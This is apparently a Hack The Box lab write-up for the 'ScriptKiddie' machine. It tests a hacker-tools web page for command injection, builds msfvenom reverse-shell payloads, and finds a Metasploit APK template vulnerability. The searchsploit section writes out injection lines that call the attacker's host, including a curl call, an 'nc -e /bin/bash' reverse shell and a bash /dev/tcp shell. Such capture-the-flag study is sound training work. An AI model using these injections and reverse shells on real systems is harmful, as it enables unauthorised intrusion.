# Website

Visiting `http://10.10.10.226:5000` we see a site full of 'hacker tools':

![[Pasted image 20210612124335.png]]

It looks like under the hood this will be running some common linux penetration testing commands. Let's try a few.

## Nmap

Let's try nmapping the box itself to test this, submitting `127.0.0.1`:

![[Pasted image 20210612124713.png]]

Cool! That seems to work, and might be relevant if there's some sort of SSRF vulnerability later. What if there's some form of command injection?

I tried a few payloads here:
- `127.0.0.1 && id`
- `127.0.0.1; id`
- `127.0.0.1 -oA local` (to see if it was blocking traditional command injection syntax but would accept other commands)

They all gave me the same response, "invalid ip":

![[Pasted image 20210612124906.png]]

No problem - let's move on to the next command.

## Payloads

This is a 'payload generator', which makes me think it might be running something like `msfvenom`.

### Trying to Upload a Reverse Shell Template

There is an option to choose an Operating System, and an option to upload a template file. Perhaps we can upload a reverse shell to the box via the template upload?

Curling the site with verbose mode doesn't tell us anything new about what it's running:

```bash
┌──(mac㉿kali)-[~]
└─$ curl -v 10.10.10.226:5000
*   Trying 10.10.10.226:5000...
* Connected to 10.10.10.226 (10.10.10.226) port 5000 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.226:5000
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 2135
< Server: Werkzeug/0.16.1 Python/3.8.5
< Date: Sat, 12 Jun 2021 12:00:52 GMT
```

I'm not sure what format to use for a payload on a Werkzeug server - from experience with flask, I'm pretty sure it won't just execute a file if we visit its path. We also didn't discover any sort of `/uploads` path in our [[Writeups/Hack the Box/Boxes/Scriptkiddie/5 - Enumeration#Gobuster|Gobuster]] scan, but let's just generate a generic payload and see what happens:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie]
└─$ msfvenom -p linux/x64/shell_reverse_tcp -o test_shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Saved as: test_shell
```

We don't particularly care about the settings for the payload the *site* is generating - we just want it to save our malicious template:

![[Pasted image 20210612125842.png]]

However, this doesn't work:

![[Pasted image 20210612125902.png]]

Windows requires an exe. So if we select linux as our OS instead, will it take our file? This time it requires an ELF:

![[Pasted image 20210612130005.png]]

The first time I did this box, I searched for an ELF file and grabbed its magic bytes, then sent that to a test file just to see if it would upload:

```bash
$ head -c 8 ~/Documents/enum/pspy64 > elfy
$ file elfy
elfy: ELF 64-bit LSB (SYSV)
$ echo "hello" >> elfy
$ file elfy
elfy: ELF 64-bit LSB (SYSV)
```

However, you can also generate an ELF with msfvenom, which is what I tried the second time round:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie]
└─$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o test_elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: test_elf
```

I sent this off:

![[Pasted image 20210612130520.png]]

But got back the same error message. So I tried again with the `.elf` file extension:

![[Pasted image 20210612130731.png]]

This time the server hung for a while, and eventually output "something went wrong":

![[Pasted image 20210612130829.png]]

This suggests it is indeed running something like `msfvenom` in the background, as it always takes a while to execute.

I thought about looking for the file on the system - there was no `/uploads/` directory according to gobuster, but what if it's saved under `/payloads/`? Or just `/test_elf.elf`?

Both of these returned a 404:

![[Pasted image 20210612131021.png]]

Let's try to generate a working payload and see if it tells us a file location. We'll turn on Burp Suite first, then I'll try a basic Android payload without a template file to see if it gives us anything. Here's the request in Burp:

![[Pasted image 20210612131404.png]]

There's potentially a few parameters to fuzz in that request. But for now, let's see what happened. It worked!

![[Pasted image 20210612131340.png]]

The page outputs a link to `/static/payloads/[HASH]` for downloading the payload:

![[Pasted image 20210612131505.png]]

I tried looking for our malicious templates in this directory, and in `/static/templates/`, but neither worked:

![[Pasted image 20210612131620.png]]

Let's check what format the Android generator needs for a template file, just for due diligence:

![[Pasted image 20210612131745.png]]

It wants a `.apk` file. This will be useful to know later on.

### Trying Command Injection

Before I moved on to the next command, I checked for command injection in the payloads field:

![[Pasted image 20210612132004.png]]

I got "invalid lhost ip":

![[Pasted image 20210612132028.png]]

This was the same for several other command injection payloads.

## sploits

The final tool seems to just run `searchsploit`:

![[Pasted image 20210612132124.png]]

We can try some basic command injections again. I submitted `ubuntu; id` in the field, and got this message back:

![[Pasted image 20210612132213.png]]

Interesting! There seems to be some sort of command injection protection. I tried a few different payloads:
- `ubuntu & id`
- `ubuntu && id`
- `ubuntu | base64`
- `'` (trying this was unlikely to cause a command injection, but it also gave the same message, suggesting any non-alphanumeric character was banned)

I also tried `ubuntu; curl http://10.10.16.211/test` to see if I got a hit on a `sudo nc -lnvp 80` listener despite the warning. This one actually worked!

![[Pasted image 20210612132748.png]]

I tried a python server:

![[Pasted image 20210612132814.png]]

So can we get a shell? I submitted `ubuntu; nc 10.10.16.211 80 -e /bin/bash`. I got a connection - but it didn't stay open:

![[Pasted image 20210612133521.png]]

Next I tried `ubuntu; bash -c 'bash -i >& /dev/tcp/10.10.16.211/80 0>&1'`, but I got the same result.

I spent a bit of time working on this, before moving on.

## CVEs in Binaries

At this point I wasn't sure where to go next, so wondered if there was a vulnerability in the binaries running on the box themselves. Here's what I thought the commands might look like:

```bash
# nmap
nmap --top-ports 100 [ip]

# payloads
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=[lhost] LPORT=443 --template [template] -o /static/payloads/...

# sploits
searchsploit [term]
```

I wondered if there was a CVE for any of these binaries, so I checked in searchsploit:

![[Pasted image 20210612134305.png]]

The final result looked promising! It was an vulnerability in metasploit itself:

```
Metasploit Framework 6.0.11 - msfvenom APK template command injection
```

And had a corresponding python script. Let's give it a try!